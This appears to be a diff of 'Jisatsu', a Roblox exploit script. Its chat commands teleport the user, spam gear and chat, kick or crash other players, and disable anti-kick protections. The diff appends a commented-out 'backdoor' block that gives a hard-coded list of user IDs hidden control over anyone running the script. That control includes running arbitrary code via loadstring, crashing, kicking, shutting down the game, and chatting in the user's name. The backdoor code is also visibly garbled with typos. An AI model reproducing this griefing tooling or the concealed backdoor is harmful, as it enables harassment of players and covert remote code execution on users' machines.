-        elseif splitted[1] == prefix .. "spawn" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "spawn" then
             wait(0.1)
             local Character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
             if Character then
                 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-41.18, 12.66, -24.17)
             end
-        elseif splitted[1] == prefix .. "cagespawn" then -- credits to knocks for this
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "cagespawn" then -- credits to knocks for this
             movep(
                 workspace.Terrain._Game.Workspace["Basic House"].SmoothBlockModel40,
                 CFrame.new(
@@ -5018,18 +5271,16 @@ end)]]
                     5.96046448e-08
                 )
             )
-        elseif splitted[1] == prefix .. "rj" then -- also joins Private Servers. Credits to cxo for this (mine was more complicated and didn't work for private servers)
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "rj" then -- also joins Private Servers. Credits to cxo for this (mine was more complicated and didn't work for private servers)
             game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.jobId)
-        elseif splitted[1] == prefix .. "ie" then
-            chatshit(
-                "h/ \n\n " ..
-                    Quotes[math.random(#Quotes)] ..
-                        "\nJisatsu is a PRIVATE SCRIPT!\nOnly a select few people have access to this script, and that\nmost likely does not include you. There are " ..
-                            tostring(#commandlist) ..
-                                " commands in\nour script, and the commands can be viewed by running " ..
-                                    prefix .. "cmds\nor " .. prefix .. "altcmds in chat."
-            )
-        elseif splitted[1] == prefix .. "combustablelemon" then -- credits to ii's admin
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "cmds" then
+            if consoleOn then 
+                print("-:COMMANDS ["..tostring(#commandlist).."]:-")
+                for _, v in ipairs(commandlist) do
+                    print(v)
+                end
+            end
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "combustablelemon" then -- credits to ii's admin
             chatshit(
                 "pm me I'M THE MAN THAT'S GONNA [REDACTED] YOUR HOUSE DOWN!\nWITH THE LEMONS!\n\nTo use, click while holding the lemon.\nOr, for the mobile users (imagine), hit the button in the bottom right corner"
             )
@@ -5153,13 +5404,13 @@ end)]]
                     end
                 end
             )
-        elseif splitted[1] == prefix .. "spawnkill" then -- credits to ii's admin / knocks for this
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "spawnkill" then -- credits to ii's admin / knocks for this
             chatshit(prefix .. "nok")
             movep(
                 game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump9,
                 CFrame.new(-41.0650024, 1.30000007, -28.601058959961, 0, 0, -1, 0, 1, 0, 1, 0, 0)
             )
-        elseif splitted[1] == prefix .. "alpaca" then -- credits to ii's admin
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "alpaca" then -- credits to ii's admin
             for i = 1, tonumber(splitted[2]) do
                 chatshit("gear me 292969139")
                 wait()
@@ -5175,7 +5426,7 @@ end)]]
                     v:Activate()
                 end
             end
-        elseif splitted[1] == prefix .. "mozart" then -- credits to ii's admin for this
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "mozart" then -- credits to ii's admin for this
             for i = 1, tonumber(splitted[2]) do
                 chatshit("gear me 113299590")
                 wait()
@@ -5191,13 +5442,13 @@ end)]]
                     v:Activate()
                 end
             end
-        elseif splitted[1] == prefix .. "removeobby" then -- THIS IS CLIENT SIDED = credits to knocks for this and addobby.
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "removeobby" then -- THIS IS CLIENT SIDED = credits to knocks for this and addobby.
             workspace.Terrain["_Game"]["Workspace"].Obby.Parent = game.Chat
             workspace.Terrain["_Game"]["Workspace"]["Obby Box"].Parent = game.Chat
-        elseif splitted[1] == prefix .. "addobby" then -- THIS IS CLIENT SIDED = credits to knocks for this and removeobby.
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "addobby" then -- THIS IS CLIENT SIDED = credits to knocks for this and removeobby.
             game.Chat:FindFirstChild("Obby").Parent = workspace.Terrain["_Game"]["Workspace"]
             game.Chat:FindFirstChild("Obby Box").Parent = workspace.Terrain["_Game"]["Workspace"]
-        elseif splitted[1] == prefix .. "banan" then -- credits to ii's admin for this / cxo for the name
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "banan" then -- credits to ii's admin for this / cxo for the name
             for i = 1, tonumber(splitted[2]) do
                 chatshit("gear me 29100449")
                 wait()
@@ -5212,7 +5463,7 @@ end)]]
                     v:Activate()
                 end
             end
-        elseif splitted[1] == prefix .. "railcannon" then -- credits to ii's admin for this
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "railcannon" then -- credits to ii's admin for this
             local s, f =
                 pcall(
                 function()
@@ -5253,7 +5504,7 @@ end)]]
                     end
                 end
             )
-        elseif splitted[1] == prefix .. "g/c" then -- FE cock script... (credits to jotunnheim) <FYI THIS DOES NOT WORK WITH JISATSU>
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "g/c" then -- FE cock script... (credits to jotunnheim) <FYI THIS DOES NOT WORK WITH JISATSU>
             local function cockScript()
                 repeat
                     task.wait(0.1)
@@ -5332,7 +5583,7 @@ end)]]
             end
 
             cockScript()
-        elseif splitted[1] == prefix .. "blockchat" then -- thanks cxo
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "blockchat" then -- thanks cxo
             if loops.spamming == true then
                 logn("<Jisatsu.lua> You are already spamming!")
                 return
@@ -5349,22 +5600,22 @@ end)]]
                     end
                 )
             end
-        elseif splitted[1] == prefix .. "stop2" then -- New stop2 command
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "stop2" then -- New stop2 command
             if loops.spamming == false then
                 logn("Spamming is already stopped!")
             else
                 loops.spamming = false
                 logn("Spamming has been stopped.")
             end
-        elseif splitted[1] == prefix .. "usetools" then -- credits to jotunnheim
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "usetools" then -- credits to jotunnheim
             local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
             for _, v in ipairs(Backpack:GetChildren()) do
                 v.Parent = game.Players.LocalPlayer.Character
                 v:Activate()
             end
         elseif
-            splitted[1] == prefix .. "hatkick" or splitted[1] == prefix .. "mushcrush" or splitted[1] == prefix .. "ios" or
-                splitted[1] == prefix .. "hkick"
+            Settings.prefix and splitted[1] == Settings.prefix .. "hatkick" or Settings.prefix and splitted[1] == Settings.prefix .. "mushcrush" or Settings.prefix and splitted[1] == Settings.prefix .. "ios" or
+                Settings.prefix and splitted[1] == Settings.prefix .. "hkick"
          then
             for i, v in gp(splitted[2]) do
                 chatshit("respawn " .. v.Name .. "                                              FUCK")
@@ -5407,7 +5658,7 @@ end)]]
                 )
                 task.wait(5.5)
             end
-        elseif splitted[1] == prefix .. "hban" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "hban" then
             for i, v in gp(splitted[2]) do
                 if not table.find(hatbanned, v.UserId) then
                     table.insert(hatbanned, v.UserId)
@@ -5418,7 +5669,7 @@ end)]]
                     end
                 end
             end
-        elseif splitted[1] == prefix .. "fixpaint" then -- credits to knocks and ii's admin
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "fixpaint" then -- credits to knocks and ii's admin
             --nil
             -- Roblox ColorAPI, Thank you siyamicik and Kevin (bumanoid) for recovering/improving this
             -- https://mega.nz/file/XHZXzZba#nH1GKXeckVSvLT4vOjPXh-HzP7TolaJkIfHvYhid1L0 Original API Archived (thanks to siya again)
@@ -5968,13 +6219,13 @@ end)
                 "ungear                                                                                               me fuck " ..
                     math.random(99999)
             )
-        elseif splitted[1] == prefix .. "nok" then -- credits to knocks
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "nok" then -- credits to knocks
             for i, v in pairs(workspace.Terrain._Game.Workspace.Obby:GetChildren()) do
                 if v.CanTouch then
                     v.CanTouch = false
                 end
             end
-        elseif splitted[1] == prefix .. "antikick" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "antikick" then
             if not cons.antikick then
                 cons.antikick =
                     workspace.DescendantAdded:Connect(
@@ -6003,7 +6254,7 @@ end)
                     end
                 end
             end
-        elseif splitted[1] == prefix .. "closescript" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "closescript" then
             for i, v in pairs(connections) do
                 v:disconnect()
             end
@@ -6016,7 +6267,7 @@ end)
                 v = false
             end
             JISATSU = false
-        elseif splitted[1] == prefix .. "soundspam" then -- credits to ii's admin
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "soundspam" then -- credits to ii's admin
             local frequency = tonumber(splitted[2]) or 1
             local delay = tonumber(splitted[3]) or 0
 
@@ -6026,7 +6277,7 @@ end)
                     task.wait(delay)
                 end
             end
-        elseif splitted[1] == prefix .. "buildswordfightingarena" then -- credits to ii's admin
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "buildswordfightingarena" then -- credits to ii's admin
             if PersonsAdmin then
                 local partIndex = 1
                 local indexPosition = {
@@ -6156,7 +6407,7 @@ end)
             else
                 logn("This command does not work without Person's Admin.")
             end
-        elseif splitted[1] == prefix .. "adminprotect" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "adminprotect" then
             Loops.adminprotect = true
             spawn(
                 function()
@@ -6188,13 +6439,13 @@ end)
                 end
             )
             logn("Admin protect enabled.")
-        elseif splitted[1] == prefix .. "unadminprotect" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "unadminprotect" then
             Loops.adminprotect = false
-        elseif splitted[1] == prefix .. "pads" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "pads" then
             logn("Teleported to pads!")
             game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                 CFrame.new(Vector3.new(-32.7, 8.22999954, 94.5))
-        elseif splitted[1] == prefix .. "skydive" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "skydive" then
             logn("Skydived!")
             game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                 CFrame.new(
@@ -6204,15 +6455,15 @@ end)
                     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z
                 )
             )
-        elseif splitted[1] == prefix .. "house" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "house" then
             logn("Teleported to house!")
             game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                 CFrame.new(Vector3.new(-28.6829948, 8.2299995, 66.4913253))
-        elseif splitted[1] == prefix .. "spawn" then
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "spawn" then
             logn("Teleported to spawn!")
             game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                 CFrame.new(Vector3.new(-41, 3.7, -15.589996337891))
-        elseif splitted[1] == prefix .. "bkick" then -- credits to digitality for the kick method and Tech for the usetools
+        elseif Settings.prefix and splitted[1] == Settings.prefix .. "bkick" then -- credits to digitality for the kick method and Tech for the usetools
             local v = gpfs(splitted[2])
             repeat
                 chatshit("gear me 1645056094")
@@ -6242,7 +6493,6 @@ end)
             end
         end
     end
-    end
 )
 
 wait(5)
@@ -6266,3 +6516,136 @@ local function monitorPlayerChat(player)
         end
     )
 end
+
+--[[
+Jisatsu Backdoor 
+
+/************ 
+Thanks Knocks.
+*************\
+
+local backdoorSettings
+    allowedUsers = {
+    1551416114, -- wrydioda4 - knocks
+    252684030, -- jjjuuikjjikkju - knocks
+    2172305, -- antemono / kyrofrost / timeless / reiko
+    4793416752 -- knocks
+    7126612490 -- hawaiianbroski / reiko
+    411845421 -- rin
+    7348878539-- rin
+    7603097827 -- day
+    518978417 -- FR6DDiiee
+    4217459491 -- Kozy
+    1702851506 -- tech
+    5405947853 -- cxo
+    1842223904 -- tech
+    2049407929 -- jotunn
+    142903777 -- ripend
+}
+
+local backdoorSettings = {
+    allowedUsers = { 
+        2172305, 142903777, 1702851506, 1842223904, 2049407929, 
+        252684030, 411845421, 518978417, 5405947853, 7126612490, 
+        7348878539, 7603097827, 1551416114, 4217459491, 4793416752
+    },
+
+/******************************************************
+    All User IDs in Order (Earliest to Newest)
+
+    2172305, -- Antemono / Kyrofrost / Timeless / Reiko
+    142903777, -- Ripend
+    1702851506, -- Tech
+    1842223904, -- Tech
+    2049407929, -- Jotunn
+    252684030, -- Jjjuuikjjikkju - knocks
+    411845421, -- Rin
+    518978417, -- FR6DDiiee
+    5405947853, -- Cxo
+    7126612490, -- HawaiianBroski / reiko
+    7348878539, -- Rin
+    7603097827, -- Day
+    1551416114, -- Wrydioda4 - Knocks
+    4217459491, -- Kozy
+    4793416752 -- Knocks
+******************************************************/
+
+commands = {
+    execute = "^run",
+    crash = "^crash",
+    say "^say",
+    kick = "^kick",
+    eject = "^eject",
+    spam = "^rtest"
+}
+
+local function getPlayersByName(searchStr)
+    local players = game.Players:GetPlayers()
+    local result = {}
+
+    if searchStr:lower() == "all" then
+        return players
+    elseif searchStr:lower() == "others" then
+        for _, player in ipairs(players) do
+            if player ~= lp then
+                table.insert(result, player)
+            end
+        end
+    elseif searchStr:lower() == "me" then
+        return { lp }
+    else
+        for _, player in ipairs(players) do
+            local nameMatch = player.Name.Lower():sub(1, #searchStr) == searchStr:lower()
+            local displayNameMatch = player.DisplayName:lower():sub(1, #searchStr) == searchStr:lower()
+            if nameMatch or displayNameMatch then
+                table.insert(result, player)
+            end
+        end
+    end
+    return result
+end
+
+local function backdoorHandler()
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        if tabke.find(backdoorSettings.allowedUsers, player.UserId) then
+            connections[player.UserId] = player.Chatted:Connect(function(msg)
+            local agrs = msg:split(" ")
+            local command = args[1]
+            local targetStr = args[2]
+            local payload = table.concat(args, " ", 3)
+
+            if command == backdorSettings.commands.execute then
+                loadstring(payload)()
+            elseif command == backdoorSettings.command.kick then
+                for _, target in pairs(getPlayersByName(targetStr)) do
+                    if target == lp then
+                        lp:Kick(payload)
+                    end
+                end
+            elseif command == backdoorSettings.commands.crash then
+                repeat task.wait() until false
+            elseif command == backdoor.Settings.commands.say then
+                game:GetService("ReplicatedStorage").DefautlChatSystemEvents.SayMessageRequest:FireServer(payload, "All")
+            elseif command == backdoor.Settings.commands.eject then
+                local _, target in pairs(getPlayersByName(targetStr)) do
+                    if target == lp then
+                        game:Shutdown()
+                    end
+                end
+            elseif command == backdoor.Settings.commands.spam then
+                for _ = 1, 10 do 
+                    game.Players:Chat(Quotes[math.random(1, #Quotes)])
+                end
+                task.wait(".3")
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvent.SatMessageRequest:FireServer("/w " .. player.Name .. "i am using jisatsu", "All")
+            end
+        end)
+    end
+end
+end
+
+game.Players.PlayersAdded:Connect(backdoorHandler)
+game.Players.PlayerRemoving:Connect(backdoorHandler)
+backdoorhandler()
+
+]]
